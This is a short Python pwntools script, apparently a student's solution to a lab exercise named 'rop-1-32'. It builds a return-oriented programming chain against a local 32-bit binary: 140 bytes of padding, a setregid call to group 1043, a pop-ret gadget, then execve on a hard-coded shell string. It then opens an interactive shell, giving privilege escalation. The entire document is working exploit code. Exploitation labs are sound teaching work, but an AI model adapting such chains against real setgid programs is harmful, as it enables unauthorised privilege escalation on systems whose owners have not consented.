#!/usr/bin/env python
from pwn import *

offset = 140

setregid = p32(0x080483e0)
execve = p32(0xf7e26200)
pop_ret = p32(0x080486ca)
sh_addr = p32(0xf7ffba80)

buf = 'A' * offset
buf += setregid
buf += pop_ret
buf += p32(1043) * 2
buf += execve
buf += 'CCCC'
buf += sh_addr

p = process('/home/student/lab5/rop-1-32/rop-1-32')

with open('input.txt', 'w') as f:
    f.write(buf)

p.send(buf)
p.interactive()
